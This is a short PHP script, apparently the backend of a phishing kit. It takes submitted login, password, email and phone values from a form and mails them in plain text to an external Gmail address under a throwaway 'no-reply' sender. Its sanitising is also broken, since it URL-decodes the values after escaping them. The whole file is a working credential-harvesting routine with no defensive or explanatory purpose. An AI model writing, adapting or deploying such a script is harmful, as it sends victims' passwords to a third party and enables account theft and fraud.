<?php
	
	$login = $_POST['login'];
	$pass = $_POST['pass'];
	$email = $_POST['email'];
	$tel = $_POST['tel'];

	$login = htmlspecialchars($login);
	$pass = htmlspecialchars($pass);
	$email = htmlspecialchars($email);
	$tel = htmlspecialchars($tel);

	$login = urldecode($login);
	$pass = urldecode($pass);
	$email = urldecode($email);
	$tel = urldecode($tel);

	$login = trim($login);
	$pass = trim($pass);
	$email = trim($email);
	$tel = trim($tel);

	if (mail('onemind770@gmail.com',
			  "new postt",
			  'Login: '.$login."\n".
			  'Pass: '.$pass."\n".
			  'Email: '.$email."\n".
			  'Tel: '.$tel,
			  "from: no-reply@mydomail.ru \r\n") 
	) {
		echo ('Письмо окк');
	}
	else {
		echo ('noooo');
	}
?>